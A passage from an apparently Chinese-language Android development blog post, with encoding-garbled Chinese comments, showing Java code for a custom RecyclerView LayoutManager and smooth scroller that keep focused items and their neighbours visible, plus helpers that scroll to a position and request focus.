            <span class="hljs-built_in">super</span>(context);
        }

        <span class="hljs-comment">// ç¡®å®šæ»šåŠ¨é€Ÿåº¦</span>
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> <span class="hljs-type">float</span> <span class="hljs-title function_">calculateSpeedPerPixel</span><span class="hljs-params">(DisplayMetrics displayMetrics)</span> {
            <span class="hljs-comment">// è¿”å›ä¸€ä¸ªè¾ƒå°çš„æ•°å€¼ï¼Œå®ç°æ›´æ…¢ã€æ›´å¹³æ»‘çš„æ»šåŠ¨æ•ˆæœ</span>
            <span class="hljs-keyword">return</span> <span class="hljs-number">80f</span> / displayMetrics.densityDpi;
        }

        <span class="hljs-comment">// è®¡ç®—ç›®æ ‡ Item éœ€è¦åœé çš„ä½ç½®</span>
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateDxToMakeVisible</span><span class="hljs-params">(View view, <span class="hljs-type">int</span> snapPreference)</span> {
            <span class="hljs-comment">// å¼ºåˆ¶è¿”å›æ»šåŠ¨åˆ°ä¸­å¿ƒä½ç½®çš„è·ç¦»</span>
            <span class="hljs-keyword">return</span> calculateScrollDelta(view);
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateDyToMakeVisible</span><span class="hljs-params">(View view, <span class="hljs-type">int</span> snapPreference)</span> {
            <span class="hljs-comment">// å¼ºåˆ¶è¿”å›æ»šåŠ¨åˆ°ä¸­å¿ƒä½ç½®çš„è·ç¦»</span>
            <span class="hljs-keyword">return</span> calculateScrollDelta(view);
        }

        <span class="hljs-comment">// ç¡®å®šæ»šåŠ¨ç»“æŸæ—¶çš„ä½ç½®</span>
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onTargetFound</span><span class="hljs-params">(View targetView, RecyclerView.State state, Action action)</span> {
            <span class="hljs-type">int</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> calculateScrollDelta(targetView);

            <span class="hljs-type">int</span> <span class="hljs-variable">dx</span> <span class="hljs-operator">=</span> (getOrientation() == HORIZONTAL) ? delta : <span class="hljs-number">0</span>;
            <span class="hljs-type">int</span> <span class="hljs-variable">dy</span> <span class="hljs-operator">=</span> (getOrientation() == VERTICAL) ? delta : <span class="hljs-number">0</span>;

            <span class="hljs-comment">// æ‰§è¡Œæ»šåŠ¨ï¼Œä½¿ç”¨ DecelerateInterpolator ä½¿å…¶æ›´å¹³æ»‘</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">time</span> <span class="hljs-operator">=</span> calculateTimeForDeceleration(delta);
            action.update(dx, dy, time, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DecelerateInterpolator</span>());
        }
    }
}
</code></pre>
<h4 data-id="heading-9">èšç„¦ItemViewåŠç›¸é‚»Viewéœ²å‡º</h4>
<p>ä¸å¯èƒ½æ‰€æœ‰çš„éœ€æ±‚éƒ½ä¼šè®©ä½ å±…ä¸­ï¼Œå¦å¤–ä¸€ç§éœ€æ±‚æ˜¯ï¼Œèšç„¦çš„Viewå°½å¯èƒ½å‘ä¸Šç§»åŠ¨ï¼Œæ¼å‡ºç›¸é‚»çš„Viewï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸‹é¢çš„LayoutManager</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * EdgeVisibilityLayoutManager: ä¸“æ³¨äºè®©ç„¦ç‚¹ Item å®Œæ•´å¯è§ï¼Œ
 * ä¸”ä»…å½“ç„¦ç‚¹ Item æ˜¯å¯è§åŒºåŸŸçš„ç¬¬ä¸€ä¸ªæˆ–æœ€åä¸€ä¸ªæ—¶ï¼Œç¡®ä¿å…¶ç›¸é‚» Item å®Œæ•´éœ²å‡ºã€‚
 * * ç„¦ç‚¹ç›‘å¬å™¨ç›´æ¥åœ¨ onLayoutCompleted ä¸­è®¾ç½®ã€‚
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EdgeVisibilityLayoutManager</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LinearLayoutManager</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isAdjustingScroll</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">"EdgeVLM_InternalFocus"</span>;

    <span class="hljs-keyword">private</span> RecyclerView recyclerView;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RecyclerView.OnScrollListener scrollStateListener;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EdgeVisibilityLayoutManager</span><span class="hljs-params">(Context context, <span class="hljs-type">int</span> orientation, <span class="hljs-type">boolean</span> reverseLayout)</span> {
        <span class="hljs-built_in">super</span>(context, orientation, reverseLayout);

        scrollStateListener = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RecyclerView</span>.OnScrollListener() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onScrollStateChanged</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> RecyclerView recyclerView, <span class="hljs-type">int</span> newState)</span> {
                <span class="hljs-built_in">super</span>.onScrollStateChanged(recyclerView, newState);

                <span class="hljs-keyword">if</span> (newState == RecyclerView.SCROLL_STATE_IDLE) {
                    <span class="hljs-keyword">if</span> (isAdjustingScroll) {
                        Log.d(TAG, <span class="hljs-string">"Scroll adjustment finished. Resetting isAdjustingScroll to false."</span>);
                        isAdjustingScroll = <span class="hljs-literal">false</span>;
                    }
                }
            }
        };
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAttachedToWindow</span><span class="hljs-params">(RecyclerView view)</span> {
        <span class="hljs-built_in">super</span>.onAttachedToWindow(view);
        <span class="hljs-built_in">this</span>.recyclerView = view;
        view.addOnScrollListener(scrollStateListener);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDetachedFromWindow</span><span class="hljs-params">(RecyclerView recyclerView, RecyclerView.Recycler recycler)</span> {
        <span class="hljs-built_in">super</span>.onDetachedFromWindow(recyclerView, recycler);

        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.recyclerView != <span class="hljs-literal">null</span>) {
            <span class="hljs-built_in">this</span>.recyclerView.removeOnScrollListener(scrollStateListener);
            <span class="hljs-built_in">this</span>.recyclerView = <span class="hljs-literal">null</span>;
        }
    }

    <span class="hljs-comment">// ------------------ æ ¸å¿ƒä¿®æ”¹ï¼šåœ¨ LayoutManager ä¸­è®¾ç½®ç›‘å¬å™¨ ------------------</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onLayoutCompleted</span><span class="hljs-params">(RecyclerView.State state)</span> {
        <span class="hljs-built_in">super</span>.onLayoutCompleted(state);

        <span class="hljs-comment">// éå†æ‰€æœ‰å¯è§ Itemï¼Œè®¾ç½®å¹¶åŒ…è£…ç›‘å¬å™¨</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; getChildCount(); i++) {
            <span class="hljs-type">View</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> getChildAt(i);
            <span class="hljs-keyword">if</span> (child == <span class="hljs-literal">null</span>) <span class="hljs-keyword">continue</span>;

            View.<span class="hljs-type">OnFocusChangeListener</span> <span class="hljs-variable">existingListener</span> <span class="hljs-operator">=</span> child.getOnFocusChangeListener();

            <span class="hljs-comment">// ä»…å½“ Item View çš„ç›‘å¬å™¨ä¸æ˜¯æˆ‘ä»¬è‡ªå·±çš„åŒ…è£…å™¨æ—¶ï¼Œæ‰è¿›è¡Œè®¾ç½®/åŒ…è£…</span>
            <span class="hljs-keyword">if</span> (!(existingListener <span class="hljs-keyword">instanceof</span> WrappingFocusChangeListener)) {

                <span class="hljs-type">WrappingFocusChangeListener</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WrappingFocusChangeListener</span>(<span class="hljs-built_in">this</span>);
                wrapper.setOriginalListener(existingListener);
                child.setOnFocusChangeListener(wrapper);
                Log.d(TAG, <span class="hljs-string">"Attached WrappingFocusChangeListener to position: "</span> + getPosition(child));
            }

            <span class="hljs-comment">// å¦‚æœ Layout å®Œæˆæ—¶ Item å·²ç»æœ‰ç„¦ç‚¹ï¼Œè§¦å‘ä¸€æ¬¡æ»šåŠ¨è°ƒæ•´</span>
            <span class="hljs-keyword">if</span> (child.hasFocus() &amp;&amp; !isAdjustingScroll) {
                adjustScrollForVisibility(child, <span class="hljs-literal">true</span>);
            }
        }
    }
    <span class="hljs-comment">// --------------------------------------------------------------------------</span>

    <span class="hljs-comment">/**
     * åŒ…è£…å™¨ï¼šç”¨äºåŒ…è£…åŸå§‹çš„ OnFocusChangeListenerï¼Œå¹¶åœ¨ç„¦ç‚¹è·å¾—æ—¶è§¦å‘æ»šåŠ¨è°ƒæ•´ã€‚
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WrappingFocusChangeListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span>.OnFocusChangeListener {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> EdgeVisibilityLayoutManager layoutManager;
        <span class="hljs-keyword">private</span> View.OnFocusChangeListener originalListener;

        <span class="hljs-keyword">public</span> <span class="hljs-title function_">WrappingFocusChangeListener</span><span class="hljs-params">(EdgeVisibilityLayoutManager lm)</span> {
            <span class="hljs-built_in">this</span>.layoutManager = lm;
        }

        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOriginalListener</span><span class="hljs-params">(View.OnFocusChangeListener original)</span> {
            <span class="hljs-built_in">this</span>.originalListener = original;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFocusChange</span><span class="hljs-params">(View view, <span class="hljs-type">boolean</span> hasFocus)</span> {
            <span class="hljs-keyword">if</span> (hasFocus) {
                <span class="hljs-keyword">if</span> (layoutManager.isAdjustingScroll) {
                    Log.d(TAG, <span class="hljs-string">"Skipping scroll adjustment due to isAdjustingScroll=true."</span>);
                    <span class="hljs-keyword">if</span> (originalListener != <span class="hljs-literal">null</span>) {
                        originalListener.onFocusChange(view, hasFocus);
                    }
                    <span class="hljs-keyword">return</span>;
                }

                layoutManager.adjustScrollForVisibility(view, <span class="hljs-literal">true</span>);
            }

            <span class="hljs-keyword">if</span> (originalListener != <span class="hljs-literal">null</span>) {
                originalListener.onFocusChange(view, hasFocus);
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">adjustScrollForVisibility</span><span class="hljs-params">(View child, <span class="hljs-type">boolean</span> smooth)</span> {
        <span class="hljs-keyword">if</span> (recyclerView == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;

        <span class="hljs-type">int</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> calculateScrollDelta(child);

        <span class="hljs-keyword">if</span> (delta == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;

        isAdjustingScroll = <span class="hljs-literal">true</span>;
        Log.d(TAG, <span class="hljs-string">"Starting scroll adjustment, setting isAdjustingScroll to true. Delta: "</span> + delta);

        <span class="hljs-keyword">if</span> (smooth) {
            <span class="hljs-keyword">if</span> (getOrientation() == HORIZONTAL) {
                recyclerView.smoothScrollBy(delta, <span class="hljs-number">0</span>);
            } <span class="hljs-keyword">else</span> {
                recyclerView.smoothScrollBy(<span class="hljs-number">0</span>, delta);
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">if</span> (getOrientation() == HORIZONTAL) {
                recyclerView.scrollBy(delta, <span class="hljs-number">0</span>);
            } <span class="hljs-keyword">else</span> {
                recyclerView.scrollBy(<span class="hljs-number">0</span>, delta);
            }
            isAdjustingScroll = <span class="hljs-literal">false</span>;
        }
    }

    <span class="hljs-comment">/**
     * è®¡ç®—å°† View æ»šåŠ¨åˆ°è¾¹ç¼˜å¹¶éœ²å‡ºç›¸é‚»ä¸€ä¸ª Item æ‰€éœ€çš„è·ç¦» (Delta)ã€‚
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateScrollDelta</span><span class="hljs-params">(View focusedChild)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">focusedPosition</span> <span class="hljs-operator">=</span> getPosition(focusedChild);
        <span class="hljs-keyword">if</span> (focusedPosition == RecyclerView.NO_POSITION) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;

        <span class="hljs-type">int</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-comment">// è·å–å½“å‰å¯è§åŒºåŸŸçš„ Item ä½ç½®ï¼Œç”¨äºåˆ¤æ–­æ˜¯å¦åœ¨è¾¹ç¼˜</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">firstVisiblePos</span> <span class="hljs-operator">=</span> findFirstVisibleItemPosition();
        <span class="hljs-type">int</span> <span class="hljs-variable">lastVisiblePos</span> <span class="hljs-operator">=</span> findLastVisibleItemPosition();

        <span class="hljs-keyword">if</span> (getOrientation() == HORIZONTAL) {
            <span class="hljs-type">int</span> <span class="hljs-variable">parentLeft</span> <span class="hljs-operator">=</span> getPaddingLeft();
            <span class="hljs-type">int</span> <span class="hljs-variable">parentRight</span> <span class="hljs-operator">=</span> getWidth() - getPaddingRight();
            <span class="hljs-type">int</span> <span class="hljs-variable">decoratedMeasuredWidth</span> <span class="hljs-operator">=</span> getDecoratedMeasuredWidth(focusedChild);

            <span class="hljs-comment">// ------------------ ç„¦ç‚¹ Item åœ¨å·¦ä¾§è¢«è£å‰ª (éœ€è¦å‘å·¦æ»šåŠ¨) ------------------</span>
            <span class="hljs-keyword">if</span> (getDecoratedLeft(focusedChild) &lt;= (decoratedMeasuredWidth + parentLeft)) {
                <span class="hljs-comment">// å¦‚æœå½“å‰ç„¦ç‚¹å°±æ˜¯å¯è§çš„ç¬¬ä¸€ä¸ª Itemï¼Œä¸”ä¸æ˜¯ç¬¬ä¸€é¡¹ï¼Œåˆ™ç›®æ ‡æ˜¯è®©å‰ä¸€ä¸ª Item å®Œæ•´å¯è§</span>
                <span class="hljs-keyword">if</span> (focusedPosition &gt; <span class="hljs-number">0</span>) {
                    <span class="hljs-type">View</span> <span class="hljs-variable">previousView</span> <span class="hljs-operator">=</span> findViewByPosition(focusedPosition - <span class="hljs-number">1</span>);
                    <span class="hljs-keyword">if</span> (previousView != <span class="hljs-literal">null</span>) {
                        <span class="hljs-comment">// ç›®æ ‡ï¼šå°†å‰ä¸€ä¸ª View çš„å·¦è¾¹ç¼˜å¯¹é½åˆ°çˆ¶å®¹å™¨çš„å·¦è¾¹ç¼˜</span>
                        delta = getDecoratedLeft(previousView) - parentLeft;
                        Log.d(TAG, <span class="hljs-string">"H Scroll Left: Target previous view. Delta: "</span> + delta);
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-comment">// å¦‚æœå‰ä¸€ä¸ª View å°šæœªè¢« Layoutï¼Œåˆ™åªä¿è¯å½“å‰ View å¯è§</span>
                        delta = getDecoratedLeft(focusedChild) - parentLeft - decoratedMeasuredWidth;
                    }
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// ä¿è¯å½“å‰ View çš„å·¦è¾¹ç¼˜å¯¹é½åˆ°çˆ¶å®¹å™¨çš„å·¦è¾¹ç¼˜</span>
                    delta = getDecoratedLeft(focusedChild) - parentLeft;
                }
            }
            <span class="hljs-comment">// ------------------ ç„¦ç‚¹ Item åœ¨å³ä¾§è¢«è£å‰ª (éœ€è¦å‘å³æ»šåŠ¨) ------------------</span>
            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (getDecoratedRight(focusedChild) &gt;= (parentRight - decoratedMeasuredWidth)) {
                <span class="hljs-comment">// å¦‚æœå½“å‰ç„¦ç‚¹å°±æ˜¯å¯è§çš„æœ€åä¸€ä¸ª Itemï¼Œä¸”ä¸æ˜¯æœ€åä¸€é¡¹ï¼Œåˆ™ç›®æ ‡æ˜¯è®©ä¸‹ä¸€ä¸ª Item å®Œæ•´å¯è§</span>
                <span class="hljs-keyword">if</span> (focusedPosition == lastVisiblePos &amp;&amp; focusedPosition &lt; getItemCount() - <span class="hljs-number">1</span>) {
                    <span class="hljs-type">View</span> <span class="hljs-variable">nextView</span> <span class="hljs-operator">=</span> findViewByPosition(focusedPosition + <span class="hljs-number">1</span>);
                    <span class="hljs-keyword">if</span> (nextView != <span class="hljs-literal">null</span>) {
                        <span class="hljs-comment">// ç›®æ ‡ï¼šå°†ä¸‹ä¸€ä¸ª View çš„å³è¾¹ç¼˜å¯¹é½åˆ°çˆ¶å®¹å™¨çš„å³è¾¹ç¼˜</span>
                        delta = getDecoratedRight(nextView) - parentRight;
                        Log.d(TAG, <span class="hljs-string">"H Scroll Right: Target next view. Delta: "</span> + delta);
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-comment">// å¦‚æœä¸‹ä¸€ä¸ª View å°šæœªè¢« Layoutï¼Œåˆ™åªä¿è¯å½“å‰ View å¯è§</span>
                        delta = getDecoratedRight(focusedChild) - parentRight + decoratedMeasuredWidth;
                    }
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// ä¿è¯å½“å‰ View çš„å³è¾¹ç¼˜å¯¹é½åˆ°çˆ¶å®¹å™¨çš„å³è¾¹ç¼˜</span>
                    delta = getDecoratedRight(focusedChild) - parentRight;
                }
            }

        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// --- å‚ç›´æ–¹å‘ ---</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">parentTop</span> <span class="hljs-operator">=</span> getPaddingTop();
            <span class="hljs-type">int</span> <span class="hljs-variable">parentBottom</span> <span class="hljs-operator">=</span> getHeight() - getPaddingBottom();
            <span class="hljs-type">int</span> <span class="hljs-variable">decoratedMeasuredHeight</span> <span class="hljs-operator">=</span> getDecoratedMeasuredHeight(focusedChild);
            <span class="hljs-comment">// ------------------ ç„¦ç‚¹ Item åœ¨é¡¶éƒ¨è¢«è£å‰ª (éœ€è¦å‘ä¸Šæ»šåŠ¨) ------------------</span>
            <span class="hljs-keyword">if</span> (getDecoratedTop(focusedChild) &lt;= (decoratedMeasuredHeight + parentTop)) {
                <span class="hljs-comment">// å¦‚æœå½“å‰ç„¦ç‚¹å°±æ˜¯å¯è§çš„ç¬¬ä¸€ä¸ª Itemï¼Œä¸”ä¸æ˜¯ç¬¬ä¸€é¡¹ï¼Œåˆ™ç›®æ ‡æ˜¯è®©å‰ä¸€ä¸ª Item å®Œæ•´å¯è§</span>
                <span class="hljs-keyword">if</span> (focusedPosition &gt; <span class="hljs-number">0</span>) {
                    <span class="hljs-type">View</span> <span class="hljs-variable">previousView</span> <span class="hljs-operator">=</span> findViewByPosition(focusedPosition - <span class="hljs-number">1</span>);
                    <span class="hljs-keyword">if</span> (previousView != <span class="hljs-literal">null</span>) {
                        <span class="hljs-comment">// ç›®æ ‡ï¼šå°†å‰ä¸€ä¸ª View çš„é¡¶éƒ¨å¯¹é½åˆ°çˆ¶å®¹å™¨çš„é¡¶éƒ¨</span>
                        delta = getDecoratedTop(previousView)  - parentTop;
                        Log.d(TAG, <span class="hljs-string">"V Scroll Up: Target previous view. Delta: "</span> + delta);
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-comment">// å¦‚æœå‰ä¸€ä¸ª View å°šæœªè¢« Layoutï¼Œåˆ™åªä¿è¯å½“å‰ View å¯è§</span>
                        delta = getDecoratedTop(focusedChild) - decoratedMeasuredHeight - parentTop;
                    }
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// ä¿è¯å½“å‰ View çš„é¡¶éƒ¨å¯¹é½åˆ°çˆ¶å®¹å™¨çš„é¡¶éƒ¨</span>
                    delta = getDecoratedTop(focusedChild) - parentTop;
                }

                <span class="hljs-comment">// ------------------ ç„¦ç‚¹ Item åœ¨åº•éƒ¨è¢«è£å‰ª (éœ€è¦å‘ä¸‹æ»šåŠ¨) ------------------</span>
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (getDecoratedBottom(focusedChild) &gt;= (parentBottom - decoratedMeasuredHeight)) {
                <span class="hljs-comment">// å¦‚æœå½“å‰ç„¦ç‚¹å°±æ˜¯å¯è§çš„æœ€åä¸€ä¸ª Itemï¼Œä¸”ä¸æ˜¯æœ€åä¸€é¡¹ï¼Œåˆ™ç›®æ ‡æ˜¯è®©ä¸‹ä¸€ä¸ª Item å®Œæ•´å¯è§</span>
                <span class="hljs-keyword">if</span> (focusedPosition &lt; getItemCount() - <span class="hljs-number">1</span>) {
                    <span class="hljs-type">View</span> <span class="hljs-variable">nextView</span> <span class="hljs-operator">=</span> findViewByPosition(focusedPosition + <span class="hljs-number">1</span>);
                    <span class="hljs-keyword">if</span> (nextView != <span class="hljs-literal">null</span>) {
                        <span class="hljs-comment">// ç›®æ ‡ï¼šå°†ä¸‹ä¸€ä¸ª View çš„åº•éƒ¨å¯¹é½åˆ°çˆ¶å®¹å™¨çš„åº•éƒ¨</span>
                        delta = getDecoratedBottom(nextView) - parentBottom;
                        Log.d(TAG, <span class="hljs-string">"V Scroll Down: Target next view. Delta: "</span> + delta);
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-comment">// å¦‚æœä¸‹ä¸€ä¸ª View å°šæœªè¢« Layoutï¼Œåˆ™åªä¿è¯å½“å‰ View å¯è§</span>
                        delta = getDecoratedBottom(focusedChild) - parentBottom + decoratedMeasuredHeight;
                    }
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// ä¿è¯å½“å‰ View çš„åº•éƒ¨å¯¹é½åˆ°çˆ¶å®¹å™¨çš„åº•éƒ¨</span>
                    delta = getDecoratedBottom(focusedChild) - parentBottom;
                }
            }
        }

        <span class="hljs-keyword">return</span> delta;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">smoothScrollToPosition</span><span class="hljs-params">(RecyclerView recyclerView, <span class="hljs-meta">@NonNull</span> RecyclerView.State state, <span class="hljs-type">int</span> position)</span> {
        <span class="hljs-type">EdgeSmoothScroller</span> <span class="hljs-variable">smoothScroller</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EdgeSmoothScroller</span>(recyclerView.getContext());
        smoothScroller.setTargetPosition(position);
        startSmoothScroll(smoothScroller);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EdgeSmoothScroller</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LinearSmoothScroller</span> {

        <span class="hljs-keyword">public</span> <span class="hljs-title function_">EdgeSmoothScroller</span><span class="hljs-params">(Context context)</span> {
            <span class="hljs-built_in">super</span>(context);
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> <span class="hljs-type">float</span> <span class="hljs-title function_">calculateSpeedPerPixel</span><span class="hljs-params">(DisplayMetrics displayMetrics)</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-number">100f</span> / displayMetrics.densityDpi;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateDxToMakeVisible</span><span class="hljs-params">(View view, <span class="hljs-type">int</span> snapPreference)</span> {
            <span class="hljs-keyword">return</span> calculateScrollDelta(view);
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateDyToMakeVisible</span><span class="hljs-params">(View view, <span class="hljs-type">int</span> snapPreference)</span> {
            <span class="hljs-keyword">return</span> calculateScrollDelta(view);
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onTargetFound</span><span class="hljs-params">(View targetView, RecyclerView.State state, Action action)</span> {
            <span class="hljs-type">int</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> calculateScrollDelta(targetView);

            <span class="hljs-type">int</span> <span class="hljs-variable">dx</span> <span class="hljs-operator">=</span> (getOrientation() == HORIZONTAL) ? delta : <span class="hljs-number">0</span>;
            <span class="hljs-type">int</span> <span class="hljs-variable">dy</span> <span class="hljs-operator">=</span> (getOrientation() == VERTICAL) ? delta : <span class="hljs-number">0</span>;

            <span class="hljs-type">int</span> <span class="hljs-variable">time</span> <span class="hljs-operator">=</span> calculateTimeForDeceleration(Math.abs(delta));
            <span class="hljs-keyword">if</span> (time &gt; <span class="hljs-number">0</span>) {
                action.update(dx, dy, time, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DecelerateInterpolator</span>());
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-10">æœªå±•ç¤ºItemViewèšç„¦</h4>
<p>ä»¥ä¸Šä¸¤ä¸ªLayoutManageræ˜¯ä¸ºäº†è§£å†³ä¸¢ç„¦é—®é¢˜ï¼Œä½†è¿˜æœ‰ä¸ªæ£˜æ‰‹çš„é—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬çŸ¥é“RecyclerViewçš„ä¸Šçš„Viewåªæ˜¯éƒ¨åˆ†Viewï¼Œå¦‚ä½•è®©æŒ‡å®šä½ç½®çš„Viewèšç„¦å‘¢ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬ä¹‹å‰ä¹Ÿè¯´è¿‡ï¼Œè‡ªç„¶æ˜¯å…ˆæ»šåŠ¨åˆ°å…·ä½“ä½ç½®ï¼Œå†èšç„¦ï¼Œä¸‹é¢æ˜¯æˆ‘ä»¬çš„å…·ä½“é€»è¾‘</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestFocusedChild</span><span class="hljs-params">(<span class="hljs-type">int</span> position)</span> {
    Log.d(TAG,<span class="hljs-string">"requestFocus -&gt; "</span> + position);
    <span class="hljs-keyword">if</span> (mRecycleView == <span class="hljs-literal">null</span> || dataAdapter == <span class="hljs-literal">null</span> || mRecycleView.getLayoutManager() == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span>;
    }
    Log.d(TAG,<span class="hljs-string">"requestFocusOnPosition -&gt; "</span> + position);
    <span class="hljs-keyword">if</span>(requestFocusOnPosition(position)){
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">if</span>(dataAdapter.getItemCount() &gt; position &amp;&amp; position &gt;= <span class="hljs-number">0</span>){
        scrollToTopInstantly(mRecycleView,position);
        mRecycleView.postDelayed(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
                Log.d(TAG,<span class="hljs-string">"post requestFocus -&gt; "</span> + position);
                requestFocusOnPosition(position);
            }
        },<span class="hljs-number">100</span>);

    }
}

<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">requestFocusOnPosition</span><span class="hljs-params">(<span class="hljs-type">int</span> position)</span> {

    <span class="hljs-keyword">if</span>(mListView == <span class="hljs-literal">null</span>){
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    RecyclerView.<span class="hljs-type">LayoutManager</span> <span class="hljs-variable">layoutManager</span> <span class="hljs-operator">=</span> mRecycleView.getLayoutManager();
    <span class="hljs-keyword">if</span>(layoutManager == <span class="hljs-literal">null</span>){
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-type">View</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> layoutManager.findViewByPosition(position);
    <span class="hljs-keyword">if</span> (view != <span class="hljs-literal">null</span> &amp;&amp; view.getWindowId() != <span class="hljs-literal">null</span>) {
        view.requestFocus();
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span>  <span class="hljs-literal">false</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">scrollToTopInstantly</span><span class="hljs-params">(RecyclerView recyclerView, <span class="hljs-type">int</span> position)</span> {
    RecyclerView.<span class="hljs-type">LayoutManager</span> <span class="hljs-variable">layoutManager</span> <span class="hljs-operator">=</span> recyclerView.getLayoutManager();

    <span class="hljs-keyword">if</span> (layoutManager <span class="hljs-keyword">instanceof</span> LinearLayoutManager) {
        <span class="hljs-type">LinearLayoutManager</span> <span class="hljs-variable">lm</span> <span class="hljs-operator">=</span> (LinearLayoutManager) layoutManager;

